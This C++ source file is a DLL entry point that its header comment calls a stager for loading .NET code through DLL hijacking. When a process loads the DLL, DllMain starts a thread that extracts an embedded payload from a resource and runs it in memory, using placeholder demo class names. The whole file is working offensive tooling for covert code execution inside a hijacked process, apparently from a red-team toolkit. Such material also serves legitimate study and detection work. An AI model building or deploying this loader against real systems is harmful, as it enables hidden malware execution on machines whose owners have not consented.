// dllmain.cpp : Defines the entry point for the DLL application.
/*
	Author: The Wover
	Description: Provides a DllMain entry point so that our stager can execute when the DLL is loaded by a process.
		Lets you load your .NET code through any normal DLL Hijacking or similar technique.
*/
#define WIN32_LEAN_AND_MEAN
#include "stdafx.h"
#include "native.h"

static DWORD WINAPI launcher(void* h)
{

	std::cout << "Created thread to load managed code...\n";

	//The following code block loads an Assembly from memory, using a payload embedded as a Resource

	//Aquire the payload from a resource
	HRSRC res = ::FindResourceA(static_cast<HMODULE>(h),
		MAKEINTRESOURCEA(IDR_DLLENCLOSED1), "DLLENCLOSED");

	if (res)
	{

		HGLOBAL dat = ::LoadResource(static_cast<HMODULE>(h), res);
		if (dat)
		{
			unsigned char *dll =
				static_cast<unsigned char*>(::LockResource(dat));
			if (dll)
			{
				size_t len = SizeofResource(static_cast<HMODULE>(h), res);

				//Update this with the correct fully-qualified class name and method name
				//Optionally pass in arguments.
				LaunchDll(dll, len, "DemoAssemblyDLL.Demo", "Test", 0, nullptr);

				//const char* params[] = { "argument" };

				//Use to pass in arguments
				//LaunchDll(dll, len, "DemoAssemblyDLL.Demo", "Test", 1, params);

				//Use this instead if the payload is an EXE.
				//LaunchEXE(dll, len);
			}
		}
	}

	//Since we are outside of Loader Lock, we can also directly call into managed code.
	Example_Managed_CallNative();

	return 0;
};

extern "C" BOOL APIENTRY DllMain(HMODULE h, DWORD reasonForCall, void* resv)
{
	if (reasonForCall == DLL_PROCESS_ATTACH)
	{
		//Create a new thread from our proxy native function to avoid Loader Lock
		CreateThread(0, 0, launcher, h, 0, 0);
	}
	return TRUE;
}